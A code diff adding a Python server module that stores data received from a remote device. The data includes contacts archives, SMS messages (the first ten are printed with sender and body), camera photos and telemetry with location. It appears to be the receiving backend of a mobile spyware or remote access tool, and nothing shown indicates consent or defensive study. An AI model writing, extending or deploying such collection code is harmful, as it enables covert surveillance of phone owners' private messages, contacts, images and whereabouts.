@@ -1,0 +1,105 @@
+import io
+import json
+import time
+import zipfile
+from typing import Any, Dict, List, Optional
+
+from app.config import settings
+from app.logger import log_event, log_info
+from app.state import state
+
+
+def save_contacts_data(data: bytes) -> Optional[str]:
+    try:
+        settings.storage_dir.mkdir(parents=True, exist_ok=True)
+        dest = settings.storage_dir / "contacts.zip"
+        dest.write_bytes(data)
+        state.latest_contacts = str(dest)
+        state.latest_contacts_bytes = data
+        try:
+            if zipfile.is_zipfile(io.BytesIO(data)):
+                with zipfile.ZipFile(io.BytesIO(data)) as zf:
+                    if "contacts.json" in zf.namelist():
+                        with zf.open("contacts.json") as f:
+                            state.contacts_list = json.loads(f.read().decode("utf-8"))
+        except Exception:
+            pass
+        log_event(f"contacts saved {len(data)} bytes to {dest}")
+        print(f"[contacts] saved {len(data)} bytes -> {dest}")
+        return str(dest)
+    except Exception as e:
+        log_event(f"contacts error: {e}")
+        print(f"[contacts] error: {e}")
+        return None
+
+
+def process_sms_data(messages: List[Dict[str, Any]], hours: int) -> List[Dict[str, Any]]:
+    state.latest_sms = messages
+    try:
+        settings.storage_dir.mkdir(parents=True, exist_ok=True)
+        sms_file = settings.storage_dir / "latest_sms.json"
+        sms_file.write_text(json.dumps(messages, indent=2, ensure_ascii=False), encoding="utf-8")
+    except Exception:
+        pass
+    actual_hours = hours if hours > 0 else 24
+    log_event(f"sms received {len(messages)} messages (last {actual_hours}h)")
+    print(f"\n[sms] {len(messages)} messages (last {actual_hours}h):")
+    for m in messages[:10]:
+        direction = "<-" if m.get("type") == 1 else "->"
+        addr = m.get("address", "?")
+        body = m.get("body", "")
+        ts = m.get("date", "")
+        print(f"  {direction} [{ts}] {addr}: {body}")
+    if not messages:
+        print("  (none)")
+    return messages
+
+
+def process_cams_data(cams: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+    if not settings.enable_camera:
+        return []
+    state.cameras = cams
+    log_event(f"detected cameras: {cams}")
+    for cam in cams:
+        print(cam)
+    return cams
+
+
+def save_photo_data(cam_id: str, data: bytes) -> Optional[str]:
+    if not settings.enable_camera:
+        return None
+    try:
+        settings.storage_dir.mkdir(parents=True, exist_ok=True)
+        ts = time.strftime("%Y%m%d_%H%M%S")
+        dest = settings.storage_dir / f"photo_{cam_id}_{ts}.jpg"
+        dest.write_bytes(data)
+        state.latest_photo = str(dest)
+        state.latest_photo_bytes = data
+        log_event(f"camera {cam_id} captured {len(data)} bytes saved to {dest}")
+        print(f"[cam {cam_id}] saved {len(data)} bytes -> {dest}")
+        return str(dest)
+    except Exception as e:
+        log_event(f"camera capture error: {e}")
+        print(f"[cam {cam_id}] error: {e}")
+        return None
+
+
+def process_telemetry_data(header: Dict[str, Any]) -> Dict[str, Any]:
+    data = {
+        "battery": header.get("battery", {}),
+        "network": header.get("network", {}),
+        "storage": header.get("storage", {}),
+        "memory": header.get("memory", {}),
+        "device": header.get("device", {}),
+        "location": header.get("location", {}),
+    }
+    state.latest_telemetry = data
+    try:
+        settings.storage_dir.mkdir(parents=True, exist_ok=True)
+        telem_file = settings.storage_dir / "latest_telemetry.json"
+        telem_file.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
+    except Exception:
+        pass
+    log_event("telemetry updated from device")
+    print("[telemetry] updated from device")
+    return data
